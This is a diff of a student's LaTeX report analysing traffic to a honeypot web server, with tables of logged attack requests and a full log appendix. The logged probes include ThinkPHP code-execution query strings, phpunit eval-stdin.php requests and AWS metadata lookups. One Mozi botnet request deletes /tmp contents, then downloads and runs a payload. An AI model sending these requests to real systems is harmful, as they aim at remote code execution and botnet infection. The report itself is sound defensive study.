@@ -174,8 +174,9 @@ Surprisingly, I got the same amount of traffic, if not more.
 After successfully setting up the VPS, I collected data for the following few days.
 I started out with my originally planned HTTPS server, but I noticed in the live server output that multiple clients attempted to connect with HTTP, were rejected, and never attempted to reconnect.
 Given the short period of time that I had to test, I wanted as many data points as possible.
-I saw no drawback in accepting HTTP connections as well, especially since I'm not sending anything important or hosting the website on my own network.
-From Wednesday, April 29th and onwards, my server defaulted to HTTPS, but any HTTP requests sent would also be served, giving me more data points to work with.
+I saw no drawback in only accepting HTTP connections, especially since I'm not sending anything important or hosting the website on my own network.
+From Wednesday, April 29th and onwards, my server only accepted HTTP requests, giving me more data points to work with.
+This should have been my approach from the beginning - attackers are obviously going to be more attracted to a less secure protocol.
 
 
 % --------------------
@@ -183,35 +184,282 @@ From Wednesday, April 29th and onwards, my server defaulted to HTTPS, but any HT
 % --------------------
 \subsection{Analysis}
 Going into this project, I didn't expect much data to work with, but was pleasantly surprised at the amount of traffic that my server received.
-In just a few days, I received around NUMTRAFFIC requests!
-The final server logfile (unfortunately missing some days due to restarting the server) resulted in the following:
+In just a few days, I received hundreds of requests from over 50 different clients \footnote{Complete log file is attached at the end of the report}!
 
-\renewcommand{\arraystretch}{0.6}
-\footnotesize
-\newgeometry{left=0cm,bottom=0cm,top=0cm,right=0cm}
-\begin{longtable}{|l|l|l|l|}
+Most of the entries are clearly bots, since requests are often for files that don't exist on the server.
+As I analyzed more entries, it's evident that nearly every single request was made by a bot.
+This isn't extremely surprising, since it's an unknown website.
+What did surprise me, however, is that these bots didn't seem very smart.
+Most of the requests are for files that don't exist on the server.
+My guess is that these requests are common vulnerabilities in other pre-built servers, such as Apache or Lighttpd.
+At this point, I can say that the time spent on setting up a vulnerable-looking web server was nearly useless.
+Instead, I can analyze each request to see what these clients are trying to exploit.
+A large portion of requests were likely port scanners, which isn't anything new, so I will ignore those.
+Below, I analyze the more interesting entries.
+
+% Blacklisted IP
+\subsubsection{Blacklisting}
+\begin{center}
+\begin{tabular}{|l|l|l|}
 \hline
-\textbf{num} & \textbf{timestamp} & \textbf{ip} & \textbf{request} \\ \hline
-\end{longtable}
-\restoregeometry
+\multicolumn{3}{| c |}{\textbf{Table 1}} \\ \hline
+\textbf{timestamp} & \textbf{ip} & \textbf{request} \\ \hline
+2020-04-29 01:57:04 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:57:08 & 24.171.16.6 & GET /myserver.py           \\ \hline
+2020-04-29 01:57:08 & 24.171.16.6 & GET /favicon.ico           \\ \hline
+2020-04-29 01:57:32 & 24.171.16.6 & GET /vars/                 \\ \hline
+2020-04-29 01:57:33 & 24.171.16.6 & GET /vars/constants.py     \\ \hline
+2020-04-29 01:57:42 & 24.171.16.6 & GET /vars/keys/            \\ \hline
+2020-04-29 01:57:43 & 24.171.16.6 & GET /vars/keys/key.pem     \\ \hline
+2020-04-29 01:57:46 & 24.171.16.6 & GET /vars/keys/auth.txt    \\ \hline
+2020-04-29 01:57:48 & 24.171.16.6 & GET /vars/keys/cert.pem    \\ \hline
+2020-04-29 01:57:51 & 24.171.16.6 & GET /vars/\_\_pycache\_\_/ \\ \hline
+2020-04-29 01:59:03 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:03 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:03 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:04 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:04 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:04 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:04 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:04 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:05 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:05 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:05 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:05 & 24.171.16.6 & GET /                      \\ \hline
+2020-04-29 01:59:05 & 24.171.16.6 & GET /                      \\ \hline
+\end{tabular}
+\end{center}
+
+Looking at specific log entries, it's pretty clear that some attacks were being made.
+For example, Table 1 shows somebody poking around in the server's fake key and certificate files, giving up (since they're fake), and spamming the server with 'GET /' requests.
+Since this client requested the same URL 13 times within 3 seconds, it was banned.
+This was especially exciting for me - I wasn't sure if blacklisting would prove useful.
+Unfortunately, this was the only instance of the blacklist banning an IP, though.
+It's also seemingly the only instance of a real human visiting the website, since every request is for a real file.
+
+% Instance Identity Document
+\clearpage
+\subsubsection{Amazon Instance Identity Document}
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\multicolumn{2}{| c |}{\textbf{Table 2}} \\ \hline
+\textbf{ip} & \textbf{request} \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.225.84.206 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.225.84.206 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.225.84.206 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.225.84.206 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET http://169.254.169.254/latest/dynamic/instance-identity/document        \\ \hline
+44.224.22.196 & GET http://{[}::ffff:a9fe:a9fe{]}/latest/dynamic/instance-identity/document     \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET http://169.254.169.254/latest/dynamic/instance-identity/document        \\ \hline
+44.224.22.196 & GET http://{[}::ffff:a9fe:a9fe{]}/latest/dynamic/instance-identity/document     \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+44.224.22.196 & GET /latest/dynamic/instance-identity/document                              \\ \hline
+\end{tabular}
+\end{center}
+
+One very common request was one to steal the server's 'Instance Identity Document', which is a document created by VPS Amazon servers.
+From what I could find, it holds information about the VPS that you use.
+This is interesting, because it means that the clients knew that I was hosting on an Amazon server.
+These ranged from simply requesting the '/latest/dynamic/instance-identity/document' file, to some other interesting formats.
+The IP '169.254.169.254' is present, seemingly random.
+With a bit of research, I found that it's a dynamically configured link-local address, not a valid IP to route to from an outside network.
+This specific instance is for metadata distribution to Amazon EC2 servers.
+After noticing that all of these requests were sent from very close IPs, I researched a bit more.
+The IP address '44.224.22.***' is tied to an Amazon AWS server.
+This would explain how it knew about the Amazon-specific instance identity document.
+The IPv6 address '::ffff:a9fe:a9fe' is also tied to an Amazon AWS instance, supposedly a security scanner.
+It's strange that somebody would be doing this from an Amazon server.
+
+% Executing PHP/JS
+\clearpage
+\tiny
+\subsubsection{Unauthorized Code Execution}
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\multicolumn{2}{| c |}{\textbf{Table 3}} \\ \hline
+\textbf{ip} & \textbf{request} \\ \hline
+5.101.0.209    & GET /index.php?s=/Index/	hinkapp/invokefunction\&function=call\_user\_func\_array\&vars{[}0{]}=md5\&vars{[}1{]}{[}{]}=HelloThinkPHP \\ \hline
+5.101.0.209    & GET /?XDEBUG\_SESSION\_START=phpstorm                                                                                               \\ \hline
+5.101.0.209    & POST /api/jsonws/invoke                                                                                                             \\ \hline
+5.101.0.209    & GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                             \\ \hline
+5.101.0.209    & POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                            \\ \hline
+5.101.0.209    & GET /solr/admin/info/system?wt=json                                                                                                 \\ \hline
+5.101.0.209    & GET /?XDEBUG\_SESSION\_START=phpstorm                                                                                               \\ \hline
+5.101.0.209    & GET /?a=fetch\&content=\textless{}php\textgreater{}die(@md5(HelloThinkCMF))\textless{}/php\textgreater{}                            \\ \hline
+5.101.0.209    & GET /index.php?s=/Index/	hinkapp/invokefunction\&function=call\_user\_func\_array\&vars{[}0{]}=md5\&vars{[}1{]}{[}{]}=HelloThinkPHP \\ \hline
+154.8.204.200  & GET /TP/public/index.php                                                                                                            \\ \hline
+154.8.204.200  & GET /TP/index.php                                                                                                                   \\ \hline
+154.8.204.200  & GET /thinkphp/html/public/index.php                                                                                                 \\ \hline
+154.8.204.200  & GET /html/public/index.php                                                                                                          \\ \hline
+154.8.204.200  & GET /public/index.php                                                                                                               \\ \hline
+154.8.204.200  & GET /TP/html/public/index.php                                                                                                       \\ \hline
+154.8.204.200  & GET /elrekt.php                                                                                                                     \\ \hline
+154.8.204.200  & GET /index.php                                                                                                                      \\ \hline
+5.101.0.209    & POST /api/jsonws/invoke                                                                                                             \\ \hline
+110.52.140.106 & GET /phpMyAdmin/scripts/setup.php                                                                                                   \\ \hline
+110.52.140.106 & GET /phpmyadmin/scripts/setup.php                                                                                                   \\ \hline
+110.52.140.106 & GET /pma/scripts/setup.php                                                                                                          \\ \hline
+110.52.140.106 & GET /myadmin/scripts/setup.php                                                                                                      \\ \hline
+110.52.140.106 & GET /MyAdmin/scripts/setup.php                                                                                                      \\ \hline
+18.138.224.111 & POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                     \\ \hline
+18.138.224.111 & POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+18.138.224.111 & POST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                    \\ \hline
+18.138.224.111 & POST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                      \\ \hline
+18.138.224.111 & POST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+18.138.224.111 & POST //crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+18.138.224.111 & POST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                      \\ \hline
+18.138.224.111 & POST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+18.138.224.111 & POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                   \\ \hline
+18.138.224.111 & POST //lib/phpunit/Util/PHP/eval-stdin.php                                                                                          \\ \hline
+18.138.224.111 & POST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php                                                                                  \\ \hline
+18.138.224.111 & POST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                              \\ \hline
+18.138.224.111 & POST //lib/phpunit/src/Util/PHP/eval-stdin.php                                                                                      \\ \hline
+18.138.224.111 & POST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+18.138.224.111 & POST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+18.138.224.111 & POST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                     \\ \hline
+18.138.224.111 & POST //phpunit/Util/PHP/eval-stdin.php                                                                                              \\ \hline
+18.138.224.111 & POST //phpunit/phpunit/Util/PHP/eval-stdin.php                                                                                      \\ \hline
+18.138.224.111 & POST //phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                                  \\ \hline
+18.138.224.111 & POST //phpunit/src/Util/PHP/eval-stdin.php                                                                                          \\ \hline
+18.138.224.111 & POST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                 \\ \hline
+18.138.224.111 & POST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                             \\ \hline
+18.138.224.111 & POST //vendor/phpunit/Util/PHP/eval-stdin.php                                                                                       \\ \hline
+18.138.224.111 & POST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php                                                                               \\ \hline
+18.138.224.111 & POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                           \\ \hline
+18.138.224.111 & POST //vendor/phpunit/src/Util/PHP/eval-stdin.php                                                                                   \\ \hline
+18.138.224.111 & POST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                             \\ \hline
+18.138.224.111 & POST //wp-content/plugins/dzs-videogallery/class\_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                          \\ \hline
+18.138.224.111 & POST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                        \\ \hline
+18.138.224.111 & POST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                  \\ \hline
+18.138.224.111 & POST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                       \\ \hline
+110.52.140.106 & GET /phpMyAdmin/scripts/setup.php                                                                                                   \\ \hline
+110.52.140.106 & GET /phpmyadmin/scripts/setup.php                                                                                                   \\ \hline
+110.52.140.106 & GET /pma/scripts/setup.php                                                                                                          \\ \hline
+110.52.140.106 & GET /myadmin/scripts/setup.php                                                                                                      \\ \hline
+110.52.140.106 & GET /MyAdmin/scripts/setup.php                                                                                                      \\ \hline
+5.101.0.209    & GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                             \\ \hline
+\end{tabular}
+\end{center}
 \normalsize
 
-Only use num, timestamp, ip, request (without HTTP/1.)
+Another very common type of request was to execute PHP code or Javascript that may have been present.
+I expected to receive these - it's the most common attack on web servers.
+The requests range from simple admin setup scripts complicated requests using a query string to execute code.
+My guess is that the longer requests attempted to exploit the query string parsing, similar to how SQL injection works.
+Luckily, I never use the query string in my server, so this was negligible.
+The POST requests also seem to try to maliciously exploit the URI parser, using 2 slashes at the beginning.
+If my server used PHP or JS, and was more in-depth, these requests may have been compromising.
+Just glancing over the requests, it impresses me that people have figured out a way to sanitize input and prevent these sorts of attacks.
 
-SELECT num,timestamp,ip,request
-FROM webserver-logs.logfile
-WHERE NOT ip='73.103.88.65'
-INTO OUTFILE '/var/lib/mysql-files/logs.csv'
-FIELDS TERMINATED BY ','
-ENCLOSED BY '"'
-LINES TERMINATED BY '/n';
+% Significant Attack --> 212-262
+\clearpage
+\tiny
+\subsubsection{Significant Attack}
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\multicolumn{2}{| c |}{\textbf{Table 4}} \\ \hline
+\textbf{ip} & \textbf{request} \\ \hline
+18.138.224.111 & GET /                                                                                                      \\ \hline
+18.138.224.111 & GET /.env                                                                                                  \\ \hline
+18.138.224.111 & GET /.remote                                                                                               \\ \hline
+18.138.224.111 & GET /.local                                                                                                \\ \hline
+18.138.224.111 & GET /.production                                                                                           \\ \hline
+18.138.224.111 & GET /vendor/.env                                                                                           \\ \hline
+18.138.224.111 & GET /lib/.env                                                                                              \\ \hline
+18.138.224.111 & GET /lab/.env                                                                                              \\ \hline
+18.138.224.111 & GET /cronlab/.env                                                                                          \\ \hline
+18.138.224.111 & GET /cron/.env                                                                                             \\ \hline
+18.138.224.111 & GET /core/.env                                                                                             \\ \hline
+18.138.224.111 & GET /core/app/.env                                                                                         \\ \hline
+18.138.224.111 & GET /core/Datavase/.env                                                                                    \\ \hline
+18.138.224.111 & GET /database/.env                                                                                         \\ \hline
+18.138.224.111 & GET /config/.env                                                                                           \\ \hline
+18.138.224.111 & GET /assets/.env                                                                                           \\ \hline
+18.138.224.111 & GET /app/.env                                                                                              \\ \hline
+18.138.224.111 & GET /apps/.env                                                                                             \\ \hline
+18.138.224.111 & GET /uploads/.env                                                                                          \\ \hline
+18.138.224.111 & GET /sitemaps/.env                                                                                         \\ \hline
+18.138.224.111 & POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                            \\ \hline
+18.138.224.111 & POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                              \\ \hline
+18.138.224.111 & POST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                           \\ \hline
+18.138.224.111 & POST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                             \\ \hline
+18.138.224.111 & POST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                              \\ \hline
+18.138.224.111 & POST //crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                              \\ \hline
+18.138.224.111 & POST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                             \\ \hline
+18.138.224.111 & POST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                              \\ \hline
+18.138.224.111 & POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                          \\ \hline
+18.138.224.111 & POST //lib/phpunit/Util/PHP/eval-stdin.php                                                                 \\ \hline
+18.138.224.111 & POST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php                                                         \\ \hline
+18.138.224.111 & POST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                     \\ \hline
+18.138.224.111 & POST //lib/phpunit/src/Util/PHP/eval-stdin.php                                                             \\ \hline
+18.138.224.111 & POST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                              \\ \hline
+18.138.224.111 & POST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                              \\ \hline
+18.138.224.111 & POST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                            \\ \hline
+18.138.224.111 & POST //phpunit/Util/PHP/eval-stdin.php                                                                     \\ \hline
+18.138.224.111 & POST //phpunit/phpunit/Util/PHP/eval-stdin.php                                                             \\ \hline
+18.138.224.111 & POST //phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                         \\ \hline
+18.138.224.111 & POST //phpunit/src/Util/PHP/eval-stdin.php                                                                 \\ \hline
+18.138.224.111 & POST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                        \\ \hline
+18.138.224.111 & POST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                    \\ \hline
+18.138.224.111 & POST //vendor/phpunit/Util/PHP/eval-stdin.php                                                              \\ \hline
+18.138.224.111 & POST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php                                                      \\ \hline
+18.138.224.111 & POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                  \\ \hline
+18.138.224.111 & POST //vendor/phpunit/src/Util/PHP/eval-stdin.php                                                          \\ \hline
+18.138.224.111 & POST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                    \\ \hline
+18.138.224.111 & POST //wp-content/plugins/dzs-videogallery/class\_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php \\ \hline
+18.138.224.111 & POST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php               \\ \hline
+18.138.224.111 & POST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php         \\ \hline
+18.138.224.111 & POST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                              \\ \hline
+\end{tabular}
+\end{center}
+\normalsize
 
-sudo mv /var/lib/mysql-files/logs.csv ./
+The most significant attack on the server happened during the evening of April 29th.
+The IP '18.138.224.111' comes from Singapore, and ended up making over 50 requests to the server by the time that I shut it down.
+The client tries to request some common resources, like core, library, and config files.
+It then moves on and tries to execute PHP code, like I mentioned in the previous section.
+Looking closely, there are some requests for server environment information, Cloudflare, and Jekyll.
+The attacker was clearly trying to gain more information on the server, making it easier to narrow down possible vulnerabilities.
+Although it didn't make any real progress, it shows the complexity that some of these attakers have.
+This is for a mundane web server, too.
+Imagine what sorts of spam and attacks would happen to somewhere more important!
 
-%s/ HTTP\/1.1//
+% Reverse shell?
+\clearpage
+\subsubsection{Reverse Shell}
+\begin{center}
+\scriptsize
+\begin{tabular}{|l|l|}
+\hline
+\multicolumn{2}{| c |}{\textbf{Table 5}} \\ \hline
+\textbf{ip} & \textbf{request} \\ \hline
+49.143.32.6 & GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws \\ \hline
+\end{tabular}
+\end{center}
+\normalsize
 
-As you can see, there were quite a few instances where the connection was very clearly a bot that was scanning for common vulnerabilities.
-
+The scariest attack, obviously from somebody who knew what they were doing, was one that attempted to create a reverse shell.
+If successful, it would go into '/tmp', remove everything (rm -rf *), download 'Mozi', and executes it.
+'Mozi' is a family of malware used to form a P2P botnet that often performs DDoS attacks.
+This means that, instead of DDoS packets coming from one place, they come from real clients scattered across the world.
+This was an attempt to use my server to send denial-of-service packets to other servers.
+If successful, my server could have been blacklisted from some places, making it annoying to continue using.
+It would also likely get me in trouble with Amazon.
+This simple request would almost certainly go undetected in a normal server.
+Luckily, this file didn't exist on the server, so my security went uncompromised.
 
 %------------------------------------------
 %                CONCLUSION               |
@@ -220,10 +468,15 @@ As you can see, there were quite a few instances where the connection was very c
 If given the chance to do this project again, I would change a few things.
 After a day or two, it became clear that my method of setting up the server to look vulnerable was not extremely effective.
 A majority of attackers requested common authentication files, or tried to make the server unintentionally execute code.
-I would put in a bit more research towards the most common files that attackers are looking for.
+I would put in a bit more research towards the most common files and vulnerabilities that attackers look for.
 I would have given myself more time to gather data and restructure the server as needed.
 Hacking entities on the internet are often bots that look for common vulnerabilities - rarely real people.
 Less focus should have been put on the directory browsing, since I only had a few instances that made it seem like a real person was on my server.
+One possible route would to be with the available SSL ciphers.
+When an SSL connection is made, the server presents the available SSL ciphers to use.
+One common attack is to go in and delete the strong ciphers from that list.
+Maybe I could research ciphers and hand-pick ones that are relatively weak.
+This may draw more traffic from clients looking to exploit the weak connection.
 In addition to these changes, I would steer clear of hosting the server on my home network.
 It only caused me headaches, and gave me less data to work with.
 The longer that I left the server up, the more active it became, so if I avoided self-hosting from the beginning, I would have significantly more data.
@@ -237,7 +490,212 @@ It's an interesting occupation - if you do your job well, nobody knows, but if y
 I have a feeling that this project won't quite end here, maybe stemming into a hobby to beef up my network security.
 This project has sparked interest in me at a level that school hasn't, and I'm eager to learn more.
 
-\clearpage
 \nocite{cohen_honeypot}
 \printbibliography
+
+% COMPLETE LOG FILE
+
+\newgeometry{left=0mm,right=0mm,top=0mm,bottom=0mm}
+\begin{center}
+\vspace*{0.1cm}
+\Large{\textbf{LOGS (missing some days, removed my IP)}}
+\end{center}
+\begin{longtable}{|l|l|l|l|}
+\hline
+\textbf{num} & \textbf{timestamp} & \textbf{ip} & \textbf{request} \\ \hline
+20  & 2020-04-28 19:52:45 & 128.14.134.170  & GET /version                                                                                                                        \\ \hline
+21  & 2020-04-28 19:52:50 & 128.14.134.170  & GET /                                                                                                                               \\ \hline
+46  & 2020-04-28 23:43:31 & 66.102.6.230    & GET /                                                                                                                               \\ \hline
+47  & 2020-04-28 23:43:32 & 74.125.210.35   & GET /                                                                                                                               \\ \hline
+48  & 2020-04-28 23:45:25 & 144.168.162.250 & GET /                                                                                                                               \\ \hline
+49  & 2020-04-29 00:39:16 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+50  & 2020-04-29 00:39:16 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+51  & 2020-04-29 00:39:16 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+52  & 2020-04-29 00:39:17 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+53  & 2020-04-29 01:37:39 & 44.225.84.206   & GET /                                                                                                                               \\ \hline
+54  & 2020-04-29 01:37:39 & 44.225.84.206   & GET /                                                                                                                               \\ \hline
+55  & 2020-04-29 01:37:39 & 44.225.84.206   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+56  & 2020-04-29 01:37:40 & 44.225.84.206   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+57  & 2020-04-29 01:57:04 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+58  & 2020-04-29 01:57:08 & 24.171.16.6     & GET /myserver.py                                                                                                                    \\ \hline
+59  & 2020-04-29 01:57:08 & 24.171.16.6     & GET /favicon.ico                                                                                                                    \\ \hline
+60  & 2020-04-29 01:57:32 & 24.171.16.6     & GET /vars/                                                                                                                          \\ \hline
+61  & 2020-04-29 01:57:33 & 24.171.16.6     & GET /vars/constants.py                                                                                                              \\ \hline
+62  & 2020-04-29 01:57:42 & 24.171.16.6     & GET /vars/keys/                                                                                                                     \\ \hline
+63  & 2020-04-29 01:57:43 & 24.171.16.6     & GET /vars/keys/key.pem                                                                                                              \\ \hline
+64  & 2020-04-29 01:57:46 & 24.171.16.6     & GET /vars/keys/auth.txt                                                                                                             \\ \hline
+65  & 2020-04-29 01:57:48 & 24.171.16.6     & GET /vars/keys/cert.pem                                                                                                             \\ \hline
+66  & 2020-04-29 01:57:51 & 24.171.16.6     & GET /vars/\_\_pycache\_\_/                                                                                                          \\ \hline
+67  & 2020-04-29 01:59:03 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+68  & 2020-04-29 01:59:03 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+69  & 2020-04-29 01:59:03 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+70  & 2020-04-29 01:59:04 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+71  & 2020-04-29 01:59:04 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+72  & 2020-04-29 01:59:04 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+73  & 2020-04-29 01:59:04 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+74  & 2020-04-29 01:59:04 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+75  & 2020-04-29 01:59:05 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+76  & 2020-04-29 01:59:05 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+77  & 2020-04-29 01:59:05 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+78  & 2020-04-29 01:59:05 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+79  & 2020-04-29 01:59:05 & 24.171.16.6     & GET /                                                                                                                               \\ \hline
+80  & 2020-04-29 02:47:49 & 162.243.136.47  & GET /ReportServer                                                                                                                   \\ \hline
+86  & 2020-04-29 04:18:00 & 184.105.247.196 & GET /                                                                                                                               \\ \hline
+93  & 2020-04-29 06:35:19 & 83.97.20.31     & GET /                                                                                                                               \\ \hline
+94  & 2020-04-29 09:32:20 & 193.118.53.194  & GET /                                                                                                                               \\ \hline
+95  & 2020-04-29 10:09:22 & 162.243.137.42  & GET /owa/auth/logon.aspx?url=https\%3a\%2f\%2f1\%2fecp\%2f                                                                          \\ \hline
+97  & 2020-04-29 13:04:25 & 44.225.84.206   & GET /                                                                                                                               \\ \hline
+98  & 2020-04-29 13:04:26 & 44.225.84.206   & GET /                                                                                                                               \\ \hline
+99  & 2020-04-29 13:04:26 & 44.225.84.206   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+100 & 2020-04-29 13:04:27 & 44.225.84.206   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+105 & 2020-04-29 13:51:06 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+106 & 2020-04-29 13:51:07 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+107 & 2020-04-29 13:51:07 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+108 & 2020-04-29 13:51:08 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+114 & 2020-04-29 14:08:31 & 5.101.0.209     & GET /index.php?s=/Index/	hinkapp/invokefunction\&function=call\_user\_func\_array\&vars{[}0{]}=md5\&vars{[}1{]}{[}{]}=HelloThinkPHP \\ \hline
+115 & 2020-04-29 14:10:26 & 5.101.0.209     & GET /?XDEBUG\_SESSION\_START=phpstorm                                                                                               \\ \hline
+116 & 2020-04-29 14:16:28 & 5.101.0.209     & POST /api/jsonws/invoke                                                                                                             \\ \hline
+121 & 2020-04-29 15:32:01 & 45.83.66.209    & GET /                                                                                                                               \\ \hline
+122 & 2020-04-29 16:40:13 & 5.101.0.209     & GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                             \\ \hline
+123 & 2020-04-29 16:40:13 & 5.101.0.209     & POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php                                                                            \\ \hline
+129 & 2020-04-29 19:51:43 & 162.243.142.72  & GET /                                                                                                                               \\ \hline
+144 & 2020-04-30 01:04:32 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+145 & 2020-04-30 01:04:32 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+146 & 2020-04-30 01:04:32 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+147 & 2020-04-30 01:04:33 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+148 & 2020-04-30 01:04:33 & 44.224.22.196   & GET /latest/dynamic/instance-identity/document                                                                                      \\ \hline
+158 & 2020-04-30 01:06:01 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
+159 & 2020-04-30 01:06:02 & 44.224.22.196   & GET /                                                                                                                               \\ \hline
